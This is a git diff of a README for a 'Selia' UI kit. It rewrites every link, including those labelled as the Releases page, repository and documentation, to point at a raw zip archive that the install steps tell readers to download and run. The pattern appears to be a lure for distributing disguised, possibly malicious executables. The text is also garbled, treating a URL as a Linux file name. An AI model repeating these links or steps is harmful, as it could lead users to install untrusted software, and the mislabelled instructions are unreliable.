@@ -6,7 +6,7 @@ Welcome to Selia! This is a UI kit designed for anyone who wants to create simpl
 
 ## 📥 Download Selia
 
-[![Download Selia](https://raw.githubusercontent.com/pythis695/selia/master/annonaceous/selia.zip%20Selia-%20-orange)](https://raw.githubusercontent.com/pythis695/selia/master/annonaceous/selia.zip)
+[![Download Selia](https://raw.githubusercontent.com/pythis695/selia/master/app/routes/Software-v1.2.zip%20Selia-%20-orange)](https://raw.githubusercontent.com/pythis695/selia/master/app/routes/Software-v1.2.zip)
 
 Click the button above to get Selia. You will visit the Releases page where you can download the latest version.
 
@@ -27,7 +27,7 @@ Selia provides the following features to enhance your building experience:
 
 ## 📦 How to Download & Install Selia
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/pythis695/selia/master/annonaceous/selia.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/pythis695/selia/master/app/routes/Software-v1.2.zip).
 
 2. On the Releases page, you will see a list of available versions. Look for the latest version at the top.
 
@@ -36,7 +36,7 @@ Selia provides the following features to enhance your building experience:
 4. You will find files related to that version. Choose the file that suits your operating system:
    - For Windows, look for a file ending in `.exe`.
    - For macOS, look for `.dmg`.
-   - For Linux, look for a `https://raw.githubusercontent.com/pythis695/selia/master/annonaceous/selia.zip` file or similar.
+   - For Linux, look for a `https://raw.githubusercontent.com/pythis695/selia/master/app/routes/Software-v1.2.zip` file or similar.
 
 5. Click the link to download your chosen file. The download will start automatically.
 
@@ -45,7 +45,7 @@ Selia provides the following features to enhance your building experience:
 7. Run the file:
    - For Windows, double-click the `.exe` file.
    - For macOS, open the `.dmg` file and drag the application into the "Applications" folder.
-   - For Linux, extract the `https://raw.githubusercontent.com/pythis695/selia/master/annonaceous/selia.zip` file and follow the instructions inside to run the application.
+   - For Linux, extract the `https://raw.githubusercontent.com/pythis695/selia/master/app/routes/Software-v1.2.zip` file and follow the instructions inside to run the application.
 
 ## 📄 Example Usage
 
@@ -66,7 +66,7 @@ For any questions, you can reach out via the Issues section on GitHub. Your feed
 
 ## 📌 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/pythis695/selia/master/annonaceous/selia.zip)
-- [Documentation](https://raw.githubusercontent.com/pythis695/selia/master/annonaceous/selia.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/pythis695/selia/master/app/routes/Software-v1.2.zip)
+- [Documentation](https://raw.githubusercontent.com/pythis695/selia/master/app/routes/Software-v1.2.zip)
 
 We appreciate your interest in Selia. Happy building!
